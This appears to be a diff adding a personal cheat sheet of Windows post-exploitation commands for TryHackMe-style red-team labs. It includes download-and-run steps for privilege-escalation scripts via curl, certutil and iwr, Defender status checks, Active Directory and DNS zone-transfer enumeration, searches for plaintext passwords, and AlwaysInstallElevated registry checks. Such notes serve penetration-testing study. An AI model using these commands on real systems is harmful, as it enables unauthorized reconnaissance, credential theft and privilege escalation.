@@ -1,0 +1,62 @@
+curl -o win.exe "http://127.0.0.1/linpeas.exe"
+certutil -urlcache -f "http://127.0.0.1/linpeas.exe" win.exe
+[TODO] impacket-smbserver
+Start-Transcript -Path peace_skan.txt -Append
+.\winpeas.ps1
+Stop-Transcript
+
+
+
+whoami /priv
+runas /user:Administrator cmd.exe    ### sudo sla windows
+ver
+systeminfo
+sc query state=all
+tasklist /svc
+ipconfig
+
+schtasks /query /fo LIST /v
+wmic process get name,executablepath
+wmic service get name,displayname,pathname,startmode
+wmic product get name,version,vendor
+
+icacls C:\Users
+
+Get-ADUser -Filter *
+
+Get-ADUser -Filter * -SearchBase "DC=THMREDTEAM,DC=com"
+get-service windefend
+Get-MpComputerStatus | select RealTimeProtectionEnabled
+
+#Services
+net start
+wmic service where "name like 'THM Service'" get Name,PathName
+get-process -name thm-service
+netstat -ano | findstr "2568"
+
+#DNS
+nslookup.exe
+server 10.10.161.56
+ls -d thmredteam.com
+dig @10.10.183.215 redteam.thm -t AXFR
+
+
+findstr /si password *.txt
+findstr /si password C:\Users\*.config
+
+netstat -ano
+
+Powershell only:
+
+iwr -Uri "http://127.0.0.1/linpeas.exe" -OutFile "win.exe"
+Get-ChildItem -Path C:\Users -Recurse -Filter "flag.txt" -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Recurse -Filter "flag.txt" -ErrorAction SilentlyContinue
+
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+
+
+https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
+https://delinea.com/blog/windows-privilege-escalation
+https://sirensecurity.io/blog/windows-privilege-escalation-resources/
+
